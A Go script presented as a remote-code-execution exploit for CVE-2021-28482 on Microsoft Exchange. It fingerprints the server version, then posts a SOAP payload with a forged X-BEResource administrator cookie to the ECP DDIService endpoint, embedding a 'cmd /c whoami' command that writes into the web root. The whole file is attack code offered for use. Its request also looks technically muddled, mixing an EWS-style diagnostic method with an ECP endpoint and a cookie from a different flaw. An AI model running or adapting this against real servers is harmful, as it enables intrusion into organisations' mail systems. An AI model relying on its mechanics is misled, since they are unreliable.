package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	fmt.Println("Usage: ./cve_2021_28482 url")
	url := os.Args[1]
	url = strings.TrimSuffix(url, "/")
	r, err := http.Get(url + "/owa/auth/logon.aspx")
	if err != nil {
		panic(err)
	}
	defer r.Body.Close()
	if version, ok := r.Header["X-Owa-Version"]; ok {
		fmt.Println("[+] Exchange version:", version[0])
		if strings.HasPrefix(version[0], "15.1") {
			fmt.Println("[+] The target might include version 15.1")
		} else {
			fmt.Println("[-] The target is not vulnerable.")
			return
		}
	} else {
		fmt.Println("[-] The target is not an Exchange server.")
		return
	}

	fmt.Println("[+] Sending payload...")
	payload := `<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
      <t:RequestServerVersion Version="Exchange2016" />
  </soap:Header>
  <soap:Body >
      <m:ExecuteDiagnosticMethod>
          <m:ServerVersionInfo/>
          <m:ObjectId>
              <t:DistinguishedFolderId Id="calendar">
                  <t:Mailbox>
                      <t:EmailAddress>administrator@exchangelab.local</t:EmailAddress>
                  </t:Mailbox>
              </t:DistinguishedFolderId>
          </m:ObjectId>
          <m:Method xmlns:pwned="http://tempuri.org/#pwned" MethodName="pwned:pwned">
              <m:Parameters xmlns="">
                  <!-- command to execute -->
                  <pwned:pwned>cmd /c whoami > c:\inetpub\wwwroot\test.txt</pwned:pwned>
              </m:Parameters>
          </m:Method>
      </m:ExecuteDiagnosticMethod>
  </soap:Body>
</soap:Envelope>`

	headers := map[string]string{
		"Content-Type": "text/xml",
		"User-Agent":   "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 AttackEx (KHTML, like Gecko) Version/5.1 Safari/534.50",
		"Cookie":       "X-BEResource=admin@exchangelab.local~1942062522; ClientId=BLAHBLAHBLAH; ClientRequestId=BLAHBLAHBLAH;",
	}

	client := &http.Client{}
	req, err := http.NewRequest("POST", url+"/ecp/DDI/DDIService.svc/SetObject", bytes.NewBufferString(payload))
	if err != nil {
		panic(err)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	if resp.StatusCode == 200 && strings.Contains(string(body), "<MessageText>Success</MessageText>") {
		fmt.Println("[+] The target might vulnerable.")
	}
}
